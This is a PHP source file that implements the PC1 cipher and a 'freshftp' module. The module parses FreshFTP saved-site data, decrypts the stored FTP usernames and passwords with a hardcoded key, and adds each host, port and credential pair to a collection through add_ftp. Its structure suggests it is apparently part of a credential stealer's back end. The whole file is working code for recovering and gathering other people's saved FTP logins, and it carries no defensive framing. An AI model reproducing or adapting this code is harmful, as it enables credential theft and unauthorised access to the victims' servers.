<?php
class PC1 {
	var $pkax;
	var $pkbx;
	var $pkcx;
	var $pkdx;
	var $pksi;
	var $pktmp;
	var $x1a2;
	var $pkres;
	var $pki;
	var $inter;
	var $cfc;
	var $cfd;
	var $compte;
	var $x1a0;
	var $cle;
	var $pkc;
	var $plainlen;
	var $ascipherlen;
	var $plainText;
	var $ascCipherText;


	function PC1() {
	}

	function pkfin() {
		for ($j=0;$j<16;$j++) {
			$this->cle[$j] = "";
		}
		for ($j=0;$j<8;$j++) {
			$this->x1a0[$j] = 0;
		}
		$this->pkax = 0;
		$this->pkbx = 0;
		$this->pkcx = 0;
		$this->pkdx = 0;
		$this->pksi = 0;
		$this->pktmp = 0;
		$this->x1a2 = 0;
		$this->pkres = 0;
		$this->pki = 0;
		$this->inter = 0;
		$this->cfc = 0;
		$this->cfd = 0;
		$this->compte = 0;
		$this->pkc = 0;
	}

	function pkcode() {
		$this->pkdx = $this->x1a2 + $this->pki;
		$this->pkax = $this->x1a0[$this->pki];
		$this->pkcx = 0x015a;
		$this->pkbx = 0x4e35;
		$this->pktmp = $this->pkax;
		$this->pkax = $this->pksi;
		$this->pksi = $this->pktmp;
		$this->pktmp = $this->pkax;
		$this->pkax = $this->pkdx;
		$this->pkdx = $this->pktmp;
		if ($this->pkax != 0)	{
			$this->pkax = $this->wordmultiply($this->pkax, $this->pkbx);
		}
		$this->pktmp = $this->pkax;
		$this->pkax = $this->pkcx;
		$this->pkcx = $this->pktmp;
		if ($this->pkax != 0)	{
			$this->pkax = $this->wordmultiply($this->pkax, $this->pksi);
			$this->pkcx = $this->wordsum($this->pkax, $this->pkcx);
		}
		$this->pktmp = $this->pkax;
		$this->pkax = $this->pksi;
		$this->pksi = $this->pktmp;
		$this->pkax = $this->wordmultiply($this->pkax, $this->pkbx);
		$this->pkdx = $this->wordsum($this->pkcx, $this->pkdx);
		$this->pkax = $this->wordsum($this->pkax, 1);
		$this->x1a2 = $this->pkdx;
		$this->x1a0[$this->pki] = $this->pkax;
		$this->pkres = $this->wordxor($this->pkax, $this->pkdx);
		$this->pki++;
	}

	function wordmultiply($value1, $value2) {
		if (is_numeric($value1) && is_numeric($value2))
			$product = (($value1 * $value2) & 0xffff);
		else {
			$product = 0;
		}
		return $product;
	}

	function wordsum($value1, $value2) {
		$sum = (($value1 + $value2) & 0xffff);
		return $sum;
	}

	function wordminus($value1, $value2) {
		$minus = (($value1 - $value2) & 0xffff);
		return $minus;
	}

	function wordxor($value1, $value2) {
		$outcome = (($value1 ^ $value2) & 0xffff);
		return $outcome;
	}

	function pkassemble() {
		$this->x1a0[0] = $this->wordsum($this->wordmultiply(ord($this->cle[0]), 256), ord($this->cle[1]));
		$this->pkcode();
		$this->inter = $this->pkres;

		$this->x1a0[1] = $this->wordxor($this->x1a0[0], $this->wordsum($this->wordmultiply(ord($this->cle[2]), 256), ord($this->cle[3])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->x1a0[2] = $this->wordxor($this->x1a0[1], $this->wordsum($this->wordmultiply(ord($this->cle[4]), 256), ord($this->cle[5])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->x1a0[3] = $this->wordxor($this->x1a0[2], $this->wordsum($this->wordmultiply(ord($this->cle[6]), 256), ord($this->cle[7])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->x1a0[4] = $this->wordxor($this->x1a0[3], $this->wordsum($this->wordmultiply(ord($this->cle[8]), 256), ord($this->cle[9])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->x1a0[5] = $this->wordxor($this->x1a0[4], $this->wordsum($this->wordmultiply(ord($this->cle[10]), 256), ord($this->cle[11])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->x1a0[6] = $this->wordxor($this->x1a0[5], $this->wordsum($this->wordmultiply(ord($this->cle[12]), 256), ord($this->cle[13])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->x1a0[7] = $this->wordxor($this->x1a0[6], $this->wordsum($this->wordmultiply(ord($this->cle[14]), 256), ord($this->cle[15])));
		$this->pkcode();
		$this->inter = $this->wordxor($this->inter, $this->pkres);

		$this->pki=0;
	}

	function encrypt($in, $key) {
		$this->pkfin();
		$this->k = 0;
		$this->plainlen = strlen($in);
		for ($count=0;$count<16;$count++) {
			if (isset($key[$count]))
				$this->cle[$count] = $key[$count];
		}
		for ($count=0;$count<$this->plainlen;$count++) {
			$this->pkc = ord($in[$count]);
			$this->pkassemble();

			$this->cfc = $this->inter >> 8;
			$this->cfd = $this->inter & 255;

			for ($this->compte=0;$this->compte<sizeof($this->cle);$this->compte++) {
				$this->cle[$this->compte] = chr($this->wordxor(ord($this->cle[$this->compte]), $this->pkc));
			}
			$this->pkc = $this->wordxor($this->pkc, ($this->wordxor($this->cfc, $this->cfd)));

			$this->pkd = ($this->pkc >> 4);
			$this->pke = ($this->pkc & 15);
			$this->ascCipherText[$this->k] = $this->wordsum(0x61, $this->pkd);
			$this->k++;
			$this->ascCipherText[$this->k] = $this->wordsum(0x61, $this->pke);
			$this->k++;
		}
		$this->ascCipherText = array_map("chr", $this->ascCipherText);
		return implode("", $this->ascCipherText);

	}

	function decrypt($in, $key) {
		$this->pkfin();
		$return = "";
		for ($count=0;$count<16;$count++) {
			if (isset($key[$count]))
				$this->cle[$count] = $key[$count];
			else
				$this->cle[$count] = "";
		}
		$this->pksi = 0;
		$this->x1a2 = 0;
		$d = 0;
		$e = 0;
		$j = 0;
		$l = 0;

		$len = strlen($in);
		while ($j < $len) {
			$rep = $in[$j];
			switch($rep) {
				case "a": {
				$d = 0;
				break;
				}
				case "b": {
				$d = 1;
				break;
				}
				case "c": {
				$d = 2;
				break;
				}
				case "d": {
				$d = 3;
				break;
				}
				case "e": {
				$d = 4;
				break;
				}
				case "f": {
				$d = 5;
				break;
				}
				case "g": {
				$d = 6;
				break;
				}
				case "h": {
				$d = 7;
				break;
				}
				case "i": {
				$d = 8;
				break;
				}
				case "j": {
				$d = 9;
				break;
				}
				case "k": {
				$d = 10;
				break;
				}
				case "l": {
				$d = 11;
				break;
				}
				case "m": {
				$d = 12;
				break;
				}
				case "n": {
				$d = 13;
				break;
				}
				case "o": {
				$d = 14;
				break;
				}
				case "p": {
				$d = 15;
				break;
				}
			}

			$d = $d << 4;
			$j++;

			$rep = $in[$j];
			switch($rep) {
				case "a": {
				$e = 0;
				break;
				}
				case "b": {
				$e = 1;
				break;
				}
				case "c": {
				$e = 2;
				break;
				}
				case "d": {
				$e = 3;
				break;
				}
				case "e": {
				$e = 4;
				break;
				}
				case "f": {
				$e = 5;
				break;
				}
				case "g": {
				$e = 6;
				break;
				}
				case "h": {
				$e = 7;
				break;
				}
				case "i": {
				$e = 8;
				break;
				}
				case "j": {
				$e = 9;
				break;
				}
				case "k": {
				$e = 10;
				break;
				}
				case "l": {
				$e = 11;
				break;
				}
				case "m": {
				$e = 12;
				break;
				}
				case "n": {
				$e = 13;
				break;
				}
				case "o": {
				$e = 14;
				break;
				}
				case "p": {
				$e = 15;
				break;
				}
			}
			$c = $d + $e;
			$this->pkassemble();

			$this->cfc = $this->inter >> 8;
			$this->cfd = $this->inter & 255;

			$c = $this->wordxor($c, ($this->wordxor($this->cfc, $this->cfd)));

			for ($compte=0;$compte<16;$compte++)
				$this->cle[$compte] = chr($this->wordxor(ord($this->cle[$compte]), $c));
			$return = $return.chr($c);
			$j++;
			$l++;
		}
		return $return;
	}
}

	class Module_freshftp extends Module_
	{
		private function Decrypt($Password)
		{
			$Password = trim($Password);
			if (!strlen($Password) || (strlen($Password) % 2 != 0))
				return '';

			$pc = new PC1();
			$DecPW = $pc->decrypt(strtolower($Password), 'drianz');

			for ($i = 0; $i < strlen($DecPW); $i++)
				if ($DecPW[$i] == chr(0))
				{
					$DecPW = substr($DecPW, 0, $i);
					break;
				}
			$pc = NULL;
				
			return $DecPW;
		}
	
		private function ProcessFresh($Data)
		{
			$Stream = new Stream($Data);
			
			$Header = $Stream->getSTR(4);
			if ($Header != 'FFSM')
				return;
			
			$Stream->Skip(6);
			$nSites = $Stream->getDWORD();
			while ($nSites--)
			{
				$Stream->Skip(5);
				$Stream->getSTR($Stream->getWORD());
				$Stream->Skip(2);
				
				$Host = $Stream->getSTR($Stream->getWORD());
				$Port = $Stream->getDWORD();
				$User = $this->Decrypt($Stream->getSTR($Stream->getWORD()));
				$Pass = $this->Decrypt($Stream->getSTR($Stream->getWORD()));
				
				
				$Stream->getSTR($Stream->getWORD());
				$Stream->getSTR($Stream->getWORD());
				$Stream->Skip(75);
				$Stream->getSTR($Stream->getWORD());
				$Stream->getDWORD();
				$Stream->getSTR($Stream->getWORD());
				$Stream->getSTR($Stream->getWORD());
				$Stream->Skip(32);
				
				$this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
			}
		}
			
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
					$this->ProcessFresh($Data);
					break;
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}